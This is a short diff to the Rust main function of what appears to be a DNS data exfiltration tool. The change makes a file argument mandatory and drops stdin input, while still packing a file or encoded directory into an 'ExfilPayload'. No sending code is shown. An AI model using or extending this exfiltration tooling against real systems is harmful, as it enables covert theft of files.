@@ -81,29 +81,22 @@ async fn main() -> Result<(), DnsexError> {
             rate_limit,
             progress,
         } => {
-            let payload = if let Some(path) = file {
-                let path = Path::new(&path);
-                let (data, is_directory) = if path.is_dir() {
-                    (utils::encode_dir(path).await?, true)
-                } else {
-                    (fs::read(&path).await?, false)
-                };
+            let path = match file {
+                Some(f) => f,
+                None => return Err(DnsexError::ArgumentError("missing input".to_string())),
+            };
 
-                ExfilPayload {
-                    filename: path.into(),
-                    data,
-                    is_directory,
-                }
+            let path = Path::new(&path);
+            let (data, is_directory) = if path.is_dir() {
+                (utils::encode_dir(path).await?, true)
             } else {
-                let mut buf = Vec::new();
-                let mut stdin = io::stdin();
-                stdin.read_to_end(&mut buf).await?;
+                (fs::read(&path).await?, false)
+            };
 
-                ExfilPayload {
-                    filename: "stdin.bin".into(),
-                    data: buf,
-                    is_directory: false,
-                }
+            let payload = ExfilPayload {
+                filename: path.into(),
+                data,
+                is_directory,
             };
 
             let client_config = ClientConfig {
